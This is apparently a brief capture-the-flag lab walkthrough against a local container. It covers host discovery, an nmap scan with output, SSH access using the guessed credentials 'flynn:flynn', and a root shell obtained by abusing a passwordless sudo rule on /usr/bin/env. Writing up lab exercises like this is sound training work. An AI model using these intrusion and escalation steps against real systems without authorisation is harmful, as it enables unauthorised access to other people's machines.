# IP
172.17.0.2
# Reconnaissance
## Host discovery
``` sh
ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.064 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.029 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1029ms
rtt min/avg/max/mdev = 0.029/0.046/0.064/0.017 ms
```
## Ports scanning (TCP)
``` sh
sudo nmap -p- --open -sS -sCV --min-rate 5000 -n -Pn 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-02 10:39 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000030s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.2p1 Ubuntu 2ubuntu3.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.66 ((Ubuntu))
|_http-server-header: Apache/2.4.66 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: B2:BF:97:38:F0:E4 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.85 seconds
```
# Weak keys
After some enumeration we try SSH with same usign *flynn:flynn* and i successfully enter with ssh
# Privilege escalation
``` sh
sudo -l
(ALL) NOPASSWD: /usr/bin/env
sudo /usr/bin/env /bin/sh -p
whoami
root
```
